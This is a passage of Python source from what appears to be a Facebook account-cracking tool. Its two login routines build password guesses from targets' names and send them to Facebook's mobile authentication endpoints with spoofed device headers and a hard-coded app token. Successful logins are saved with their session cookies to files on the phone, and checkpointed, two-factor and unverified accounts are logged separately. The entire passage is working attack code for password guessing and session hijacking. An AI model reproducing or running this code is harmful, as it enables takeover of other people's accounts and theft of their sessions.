                    pas = fikr.replace('First', str(first.capitalize())).replace('Last', str(last.capitalize())).replace('first', str(first.lower())).replace('last', str(last.lower())).replace('name', names).replace('FIRST', str(first.upper())).replace('LAST', str(last.upper()))
                    
                    if "graph" in self.fstr:
                        grphx = "api"
                    else:
                        grphx = "b-api"
                    
                    ua = UsrAGnt().UserXngt()
                    
                    try:
                        fblcx, fblxx = self.loclevlUX(ua)
                    except:
                        fblcx = "en_US"; fblxx = "US"
                    
                    data = {
                        "adid": str(uuid.uuid4()),
                        "format": "json",
                        "device_id": str(uuid.uuid4()),
                        "email": str(ids),
                        "password": self.passx(pas),
                        "generate_analytics_claims": "1",
                        "community_id": "",
                        "cpl": "true",
                        "try_num": "1",
                        "family_device_id": str(uuid.uuid4()),
                        "credentials_type": "password",
                        "source": "login",
                        "error_detail_type": "button_with_disabled",
                        "enroll_misauth": "false",
                        "generate_session_cookies": "1",
                        "generate_machine_id": "1",
                        "currently_logged_in_userid": "0",
                        "locale": str(fblcx),
                        "client_country_code": str(fblxx),
                        "fb_api_req_friendly_name": "authenticate",
                    }
                    
                    headers = {
                        "content-type": "application/x-www-form-urlencoded",
                        "x-fb-sim-hni": str(random.randint(35000, 45000)),
                        "x-fb-connection-type": "unknown",
                        "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                        "user-agent": str(ua),
                        "x-fb-net-hni": str(random.randint(35000, 45000)),
                        "x-fb-connection-bandwidth": str(random.randint(2500000, 45000000)),
                        "x-fb-connection-quality": str(random.choice(["MODERATE","GOOD","POOR","EXCELLENT"])),
                        "x-fb-friendly-name": "authenticate",
                        "accept-encoding": "gzip, deflate",
                        "x-fb-http-engine": "Liger"
                    }
                    
                    po = self.session.post(url=f"https://{str(grphx)}.facebook.com/method/auth.login", params=data, headers=headers, allow_redirects=False).text
                    tst = json.loads(po)
                    
                    #print(po)
                    
                    if 'session_key' in str(tst) or 'access_token' in str(tst):
                        sbb = "cracked_by.Lumagdazz:tool"
                        cooki = ";".join(i["name"] + "=" + i["value"] for i in tst["session_cookies"])
                        cookix = f"sb={sbb};{cooki}"
                        cookie=self.convert(cookix)
                        print(f"\r\r {G}[OK] {ids} {W}|{G} {pas}")
                        with open('/sdcard/Clone-File-OK.txt', 'a') as f:
                            f.write(ids + '|' + pas + '|' + cookie + '\n')
                        self.oks.append(ids)
                        break
                    
                    elif 'approvals' in str(tst):
                        print(f"\r\r {R}[2F] {ids} {W}|{R} {pas}")
                        with open('/sdcard/Clone-File-2F.txt', 'a') as f:
                            f.write(ids + '|' + pas + '\n')
                        self.cps.append(ids)
                        break
                    
                    elif 'www.facebook.com' in tst['error_msg']:
                        print(f"\r\r {R}[CP] {ids} {W}|{R} {pas}")
                        with open('/sdcard/Clone-File-CP.txt', 'a') as f:
                            f.write(ids + '|' + pas + '\n')
                        self.cps.append(ids)
                        break
                    
                    elif '"confirmed":false' in str(po) or "User must confirm their e-mail" in str(tst):
                        print(f"\r\r {B}[NV] {ids} {W}|{B} {pas}")
                        with open('/sdcard/Clone-File-NV.txt', 'a') as f:
                            f.write(ids + '|' + pas + '\n')
                        self.novs.append(ids)
                        break
                    
                    else:continue
            self.loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self._S1_(ids,names,passlist,tl)
        except Exception as e:
            if ExceptionM == "on":
                print(e)
            else:pass
    
    def _S2_(self, ids, names, passlist, tl):
        rndclr=random.choice(['\033[1;97m','\033[38;5;46m','\033[38;5;196m','\x1b[38;5;45m','\x1b[38;5;208m'])
        sys.stdout.write(f"\r {W}[{rndclr}S2{W}] {self.loop}|{'{:.1%}'.format(self.loop/int(tl))} {G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}|{B}{len(self.novs)}{W}"),
        sys.stdout.flush()
        try:
            np = names.split(' ')
            if len(np) == 1:first = np[0];last = random.choice(['khan','hasan','sheikh'])
            elif len(np) == 3:first = np[1];last = np[2]
            else:first = np[0];last = np[1]
            for fikr in passlist:
                with requests.Session() as session:
                    pas = fikr.replace('First', str(first.capitalize())).replace('Last', str(last.capitalize())).replace('first', str(first.lower())).replace('last', str(last.lower())).replace('name', names).replace('FIRST', str(first.upper())).replace('LAST', str(last.upper()))
                    
                    if "graph" in self.fstr:
                        grphx = "graph"
                    else:
                        grphx = "b-graph"
                    
                    ua = UsrAGnt().UserXngt()
                    
                    try:
                        fblcx, fblxx = self.loclevlUX(ua)
                    except:
                        fblcx = "en_US"; fblxx = "US"
                    
                    sig = hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32]
                    nid = base64.b64encode(os.urandom(9)).decode().rstrip("=")
                    
                    data = {
                         "adid": str(uuid.uuid4()),
                         "format": "json",
                         "device_id": str(uuid.uuid4()),
                         "cpl": "true",
                         "family_device_id": str(uuid.uuid4()),
                         "credentials_type": "device_based_login_password",
                         "error_detail_type": "button_with_disabled",
                         "source": "device_based_login",
                         "email": str(ids),
                         "password": str(self.passx(pas)),
                         "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                         "generate_session_cookies": "1",
                         "meta_inf_fbmeta": "",
                         "advertiser_id": str(uuid.uuid4()),
                         "currently_logged_in_userid": "0",
                         "locale": str(fblcx),
                         "client_country_code": str(fblxx),
                         "method": "auth.login",
                         "fb_api_req_friendly_name": "authenticate",
                         "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                         "api_key": hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:32]
                    }
                    
                    headers = {
                        "User-Agent": str(ua),
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Host": f"{str(grphx)}.facebook.com",
                        "X-FB-Net-HNI": str(random.randint(35000, 45000)),
                        "X-FB-SIM-HNI": str(random.randint(35000, 45000)),
                        "X-FB-Connection-Type": str(random.choice(["MOBILE.LTE","WIFI","unknown"])),
                        "X-Tigon-Is-Retry": "False",
                        "x-fb-session-id": f"nid={str(nid)};pid=Main;tid={str(random.randint(100,999))};nc=1;fc=0;bc=0;cid={str(sig)}",
                        "x-fb-device-group": "5120",
                        "X-FB-Friendly-Name": "ViewerReactionsMutation",
                        "X-FB-Request-Analytics-Tags": "graphservice",
                        "X-FB-HTTP-Engine": "Liger",
                        "X-FB-Client-IP": "True",
                        "X-FB-Server-Cluster": "True",
                        "x-fb-connection-token": str(sig)
                    }
                    
                    po = self.session.post(url=f"https://{str(grphx)}.facebook.com/auth/login", params=data, headers=headers, allow_redirects=False).text
                    tst = json.loads(po)
                    
                    if 'session_key' in str(tst) or 'access_token' in str(tst):
                        sbb = "cracked_by.Lumagdazz:tool"
                        cooki = ";".join(i["name"] + "=" + i["value"] for i in tst["session_cookies"])
                        cookix = f"sb={sbb};{cooki}"
                        cookie=self.convert(cookix)
                        print(f"\r\r {G}[OK] {ids} {W}|{G} {pas}")
                        with open('/sdcard/Clone-File-OK.txt', 'a') as f:
                            f.write(ids + '|' + pas + '|' + cookie + '\n')
                        self.oks.append(ids)
                        break
                    
                    elif 'approvals' in str(tst):
                        print(f"\r\r {R}[2F] {ids} {W}|{R} {pas}")
                        with open('/sdcard/Clone-File-2F.txt', 'a') as f:
                            f.write(ids + '|' + pas + '\n')
                        self.cps.append(ids)
                        break
                    
                    elif 'www.facebook.com' in tst['error']['message']:
                        print(f"\r\r {R}[CP] {ids} {W}|{R} {pas}")
                        with open('/sdcard/Clone-File-CP.txt', 'a') as f:
                            f.write(ids + '|' + pas + '\n')
                        self.cps.append(ids)
                        break
                    
                    elif '"confirmed":false' in po or "User must confirm their e-mail" in str(tst):
                        print(f"\r\r {B}[NV] {ids} {W}|{B} {pas}")
                        with open('/sdcard/Clone-File-NV.txt', 'a') as f:
                            f.write(ids + '|' + pas + '\n')
                        self.novs.append(ids)
                        break
                    
                    else:continue
            self.loop += 1
        except requests.exceptions.ConnectionError:
            time.sleep(10)
            self._S2_(ids,names,passlist,tl)
        except Exception as e:
            if ExceptionM == "on":
                print(e)
            else:pass

if __name__ == '__main__':
    pp1()
    LGM()
else:
    pp1()
    LGM()
